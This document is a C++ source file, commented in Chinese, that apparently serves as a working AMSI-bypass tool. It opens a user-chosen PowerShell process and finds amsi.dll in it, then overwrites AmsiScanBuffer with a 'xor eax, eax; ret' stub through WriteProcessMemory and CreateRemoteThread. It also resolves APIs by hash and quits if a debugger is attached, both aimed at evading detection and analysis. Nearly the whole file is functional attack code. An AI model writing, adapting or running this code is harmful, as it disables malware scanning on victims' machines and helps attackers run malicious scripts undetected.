#include <windows.h>
#include <iostream>
#include <vector>
#include <string>
#include "EnableDebugPrivilege.h"
#include "IsDebugging.h"
#include "Hash.h"
#include "GetProcAddress.h"

// ============================================================
// Shellcode: 这里用 "mov eax, 42; ret" 做演示
// 如果想打残 AMSI，替换成 "xor eax, eax; ret" (返回 0 表示扫描通过)
// ============================================================
unsigned char shellcode[] = {
    0x31, 0xC0,                     // xor eax, eax
    0xC3                            // ret
};
SIZE_T shellcodeSize = sizeof(shellcode);

// ============================================================
// 函数指针类型定义
// ============================================================
typedef HANDLE (WINAPI *pOpenProcess)(DWORD, BOOL, DWORD);
typedef BOOL   (WINAPI *pEnumProcessModules)(HANDLE, HMODULE*, DWORD, LPDWORD);
typedef DWORD  (WINAPI *pGetModuleBaseNameA)(HANDLE, HMODULE, LPSTR, DWORD);
typedef BOOL   (WINAPI *pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
typedef HANDLE (WINAPI *pCreateRemoteThread)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T,
                                              LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef DWORD  (WINAPI *pWaitForSingleObject)(HANDLE, DWORD);
typedef BOOL   (WINAPI *pCloseHandle)(HANDLE);

// ============================================================
// 函数指针容器
// ============================================================
struct ApiFuncs {
    pOpenProcess           OpenProcess;
    pEnumProcessModules    EnumProcessModules;
    pGetModuleBaseNameA    GetModuleBaseNameA;
    pWriteProcessMemory    WriteProcessMemory;
    pCreateRemoteThread    CreateRemoteThread;
    pWaitForSingleObject   WaitForSingleObject;
    pCloseHandle           CloseHandle;
    bool                   valid;
};

__declspec(noinline) ApiFuncs InitApiFuncs() {
    ApiFuncs f{};
    DWORD hKernel32 = NHash32::hash("kernel32.dll");
    DWORD hPsapi    = NHash32::hash("psapi.dll");

    f.OpenProcess        = (pOpenProcess)       GetProcAddressEx(hKernel32, NHash32::hash("OpenProcess"));
    f.WriteProcessMemory = (pWriteProcessMemory)GetProcAddressEx(hKernel32, NHash32::hash("WriteProcessMemory"));
    f.CreateRemoteThread = (pCreateRemoteThread)GetProcAddressEx(hKernel32, NHash32::hash("CreateRemoteThread"));
    f.WaitForSingleObject= (pWaitForSingleObject)GetProcAddressEx(hKernel32, NHash32::hash("WaitForSingleObject"));
    f.CloseHandle        = (pCloseHandle)       GetProcAddressEx(hKernel32, NHash32::hash("CloseHandle"));

    f.EnumProcessModules = (pEnumProcessModules)GetProcAddressEx(hPsapi, NHash32::hash("EnumProcessModules"));
    f.GetModuleBaseNameA = (pGetModuleBaseNameA)GetProcAddressEx(hPsapi, NHash32::hash("GetModuleBaseNameA"));

    if (!f.EnumProcessModules)
        f.EnumProcessModules = (pEnumProcessModules)GetProcAddressEx(hKernel32, NHash32::hash("K32EnumProcessModules"));
    if (!f.GetModuleBaseNameA)
        f.GetModuleBaseNameA = (pGetModuleBaseNameA)GetProcAddressEx(hKernel32, NHash32::hash("K32GetModuleBaseNameA"));

    f.valid = f.OpenProcess && f.EnumProcessModules && f.GetModuleBaseNameA
           && f.WriteProcessMemory && f.CreateRemoteThread
           && f.WaitForSingleObject && f.CloseHandle;
    return f;
}

// ============================================================
// 在目标进程里按模块名找到模块基址
// ============================================================
__declspec(noinline)
HMODULE FindModuleByName(HANDLE hProcess, const ApiFuncs& f, const char* targetName) {
    HMODULE modules[1024];
    DWORD needed = 0;
    if (!f.EnumProcessModules(hProcess, modules, sizeof(modules), &needed))
        return nullptr;

    DWORD count = needed / sizeof(HMODULE);
    for (DWORD i = 0; i < count; i++) {
        char modName[MAX_PATH] = {0};
        f.GetModuleBaseNameA(hProcess, modules[i], modName, MAX_PATH);
        if (_stricmp(modName, targetName) == 0) {
            return modules[i];
        }
    }
    return nullptr;
}

// ============================================================
// 在主进程里解析远程 amsi.dll 的导出表，找到 AmsiScanBuffer 的地址
// 注意：这里需要跨进程读内存来解析导出表
// ============================================================
typedef BOOL (WINAPI *pReadProcessMemory)(HANDLE, LPCVOID, LPVOID, SIZE_T, SIZE_T*);

__declspec(noinline)
LPVOID FindRemoteExport(HANDLE hProcess, pReadProcessMemory ReadProcessMemory,
                        HMODULE hRemoteModule, DWORD funcHash) {
    BYTE* remoteBase = (BYTE*)hRemoteModule;

    // ① 读远程 DOS 头
    BYTE localDos[0x40] = {0};
    if (!ReadProcessMemory(hProcess, remoteBase, localDos, 0x40, NULL))
        return nullptr;

    IMAGE_DOS_HEADER* pDos = (IMAGE_DOS_HEADER*)localDos;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) return nullptr;

    // ② 读远程 NT 头
    BYTE localNt[0x108] = {0};
    if (!ReadProcessMemory(hProcess, remoteBase + pDos->e_lfanew,
                           localNt, 0x108, NULL))
        return nullptr;

    IMAGE_NT_HEADERS* pNt = (IMAGE_NT_HEADERS*)localNt;
    if (pNt->Signature != IMAGE_NT_SIGNATURE) return nullptr;

    DWORD expRva = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (expRva == 0) return nullptr;

    // ③ 读远程导出表
    IMAGE_EXPORT_DIRECTORY localExport = {0};
    if (!ReadProcessMemory(hProcess, remoteBase + expRva,
                           &localExport, sizeof(localExport), NULL))
        return nullptr;

    DWORD numberOfNames = localExport.NumberOfNames;
    DWORD addressOfNames = localExport.AddressOfNames;
    DWORD addressOfNameOrdinals = localExport.AddressOfNameOrdinals;
    DWORD addressOfFunctions = localExport.AddressOfFunctions;

    // ④ 遍历名字数组
    for (DWORD i = 0; i < numberOfNames; i++) {
        DWORD nameRVA = 0;
        if (!ReadProcessMemory(hProcess,
                               remoteBase + addressOfNames + i * 4,
                               &nameRVA, 4, NULL))
            return nullptr;

        char funcName[256] = {0};
        if (!ReadProcessMemory(hProcess, remoteBase + nameRVA,
                               funcName, sizeof(funcName) - 1, NULL))
            return nullptr;

        if (NHash32::hash(funcName) == funcHash) {
            // 找到匹配，读序号
            WORD ordinal = 0;
            if (!ReadProcessMemory(hProcess,
                                   remoteBase + addressOfNameOrdinals + i * 2,
                                   &ordinal, 2, NULL))
                return nullptr;

            // 读函数 RVA
            DWORD funcRVA = 0;
            if (!ReadProcessMemory(hProcess,
                                   remoteBase + addressOfFunctions + ordinal * 4,
                                   &funcRVA, 4, NULL))
                return nullptr;

            return remoteBase + funcRVA;
        }
    }
    return nullptr;
}

// ============================================================
// 主流程
// ============================================================
int main() {
    EnableDebugPrivilege();

    if (IsDebuggingA()) {
        std::cerr << "[-] 检测到调试器" << std::endl;
        return 0;
    }

    ApiFuncs f = InitApiFuncs();
    if (!f.valid) {
        std::cerr << "[-] 函数解析失败" << std::endl;
        return 1;
    }
    std::cout << "[+] 所有函数解析成功" << std::endl;

    // 拿 ReadProcessMemory（这里用原生 API 简化，你可以改成哈希解析）
    pReadProcessMemory ReadProcessMemory = (pReadProcessMemory)
        GetProcAddressEx(NHash32::hash("kernel32.dll"),
                         NHash32::hash("ReadProcessMemory"));

    // 输入目标 PID（PowerShell 进程）
    DWORD pid;
    std::cout << "[*] 请输入 PowerShell 进程 PID: ";
    std::cin >> pid;

    HANDLE hProcess = f.OpenProcess(
        PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION |
        PROCESS_QUERY_INFORMATION | PROCESS_CREATE_THREAD,
        FALSE, pid);
    if (!hProcess) {
        std::cerr << "[-] OpenProcess 失败: " << GetLastError() << std::endl;
        return 1;
    }

    // ① 在目标进程里找到 amsi.dll
    HMODULE hAmsi = FindModuleByName(hProcess, f, "amsi.dll");
    if (!hAmsi) {
        std::cerr << "[-] 目标进程未加载 amsi.dll" << std::endl;
        f.CloseHandle(hProcess);
        return 1;
    }
    std::cout << "[+] amsi.dll 基址: 0x" << std::hex
              << (uintptr_t)hAmsi << std::dec << std::endl;

    // ② 解析远程 amsi.dll 的导出表，找到 AmsiScanBuffer
    LPVOID pAmsiScanBuffer = FindRemoteExport(
        hProcess, ReadProcessMemory, hAmsi,
        NHash32::hash("AmsiScanBuffer"));

    if (!pAmsiScanBuffer) {
        std::cerr << "[-] 未找到 AmsiScanBuffer" << std::endl;
        f.CloseHandle(hProcess);
        return 1;
    }
    std::cout << "[+] AmsiScanBuffer 地址: 0x" << std::hex
              << (uintptr_t)pAmsiScanBuffer << std::dec << std::endl;

    // ③ 用 WriteProcessMemory 覆写 AmsiScanBuffer
    if (!f.WriteProcessMemory(hProcess, pAmsiScanBuffer,
                              shellcode, shellcodeSize, NULL)) {
        std::cerr << "[-] WriteProcessMemory 失败: " << GetLastError() << std::endl;
        f.CloseHandle(hProcess);
        return 1;
    }
    std::cout << "[+] AmsiScanBuffer 已被覆写" << std::endl;

    // ④ 创建远程线程，入口点指向 AmsiScanBuffer
    //    注意：CFG 会放行，因为这是合法导出函数入口
    HANDLE hThread = f.CreateRemoteThread(
        hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)pAmsiScanBuffer,
        NULL, 0, NULL);

    if (!hThread) {
        std::cerr << "[-] CreateRemoteThread 失败: " << GetLastError() << std::endl;
        f.CloseHandle(hProcess);
        return 1;
    }

    f.WaitForSingleObject(hThread, INFINITE);
    f.CloseHandle(hThread);
    f.CloseHandle(hProcess);

    std::cout << "[+] 模块踩踏完成！AMSI 已被打残。" << std::endl;
    system("pause");
    return 0;
}